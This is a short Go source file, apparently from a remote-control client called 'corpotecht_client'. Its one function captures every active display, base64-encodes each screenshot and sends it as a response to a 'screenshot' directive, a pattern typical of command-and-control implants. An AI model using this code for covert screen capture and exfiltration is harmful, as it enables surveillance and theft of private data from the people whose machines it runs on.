package crossplatform

import (
	"bytes"
	"corpotecht_client/utils"
	"encoding/base64"
	"image/png"
	"net/url"

	"github.com/kbinani/screenshot"
)

func TakeAndSendScreenshot() {
	utils.DebugLog("Counting number of displays.")
	n := screenshot.NumActiveDisplays()
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		utils.HandleError(err)

		imgBytes := new(bytes.Buffer)
		err = png.Encode(imgBytes, img)
		utils.HandleError(err)

		utils.DebugLog("Screenshot taken.")
		// bytes to b64
		encoded := base64.StdEncoding.EncodeToString(imgBytes.Bytes())
		payload := url.Values{
			"base64img": {encoded},
		}
		payload.Add("Directive", "screenshot")
		SendDirectiveResponse(payload)
		utils.DebugLog("Screenshot sent.")
	}
}
